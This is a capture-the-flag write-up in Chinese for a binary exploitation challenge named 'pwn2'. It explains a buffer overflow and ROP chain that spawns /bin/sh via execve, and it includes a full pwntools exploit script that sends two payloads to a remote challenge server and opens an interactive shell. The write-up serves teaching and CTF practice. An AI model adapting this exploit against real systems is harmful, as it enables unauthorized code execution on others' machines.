## pwn2
本題可以buffer overflow進行ROP攻擊，`rax`可控，`/bin/sh`必須包含在payload中放到stack上，而`rsp`只能傳遞到`rsi`，因此先試著用`execveat(0, '/bin/sh, 0, 0, 0)`呼叫。

但嘗試的過程中發現`execveat()`的第5個參數(flag)需為0，在`r8`，且`r8被設為字串不可控制，因此放棄此作法。

若要`exec()`，則`rsp`必須傳遞到`rdi`，但並沒有`mov rdi, rsi`的gadget可用，最後是在第一次payload中先`return`回`read_input`中的`mov rdx, rsi`將`rsi`傳遞至`rdx`，讀取輸入(送空白)，再跳回到`main`開頭，`push rdx`然後一路回到`read_input`，此時stack如下：

```
-------stack frame---------|--payload2--
rdx      -- main (&/bin/sh)| ---------stop here
rsi                        | pop rdi
rdi                        | SYS_exec
0x4000a9 -- magic          | pop rax (any)
rbp          --->          | ...
0x4000dc -- read_input     | ...

rsp -> rsi -> rdx -> stack -> rdi
```
再次buffer overflow，蓋掉部份目前的frame，使其從magic return時跳至gadget，而先任意pop一個暫存器(exploit中直接在此時將`rax`設為`exec()`的syscall)，接著再`ret`回`main`尾部的`pop rdi`，此時原本的`rdx`(`rsp`)就會傳遞到`rdi`，之後再將`rsi`, `rdx`都設定為`0`，然後跳至syscall即可。

注意payload2會蓋掉原本payload1中的`/bin/sh`，需要計算好相對位置再包在payload2裏面送。

### exploit
```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')
binary = ELF('start_revenge')
rop = ROP(binary)

payload = b'/bin/sh\x00'
payload += cyclic(56 - len(payload)).encode()
payload += p64(0x400116) # rsp -> rdx
payload += p64(0x4000a1) # push rdx -> #2ndpayload
payload += p64(0) # rsi = 0
payload += p64(0) # rdx = 0
payload += flat(rop.rax.address, constants.SYS_execve)
payload += p64(0x4000bf) # execve

payload2 = b''
payload2 += cyclic(16 - len(payload2)).encode()
payload2 += b'/bin/sh\x00'
payload2 += cyclic(56 - len(payload2)).encode()
payload2 += flat(rop.rax.address, constants.SYS_execve)
payload2 += p64(0x4000a9) # pop rdi; pop rsi; pop rdx;

r = remote('10.13.2.43', 20739)
r.send(payload)
r.send(b'')
r.send(payload2)
r.interactive()
```
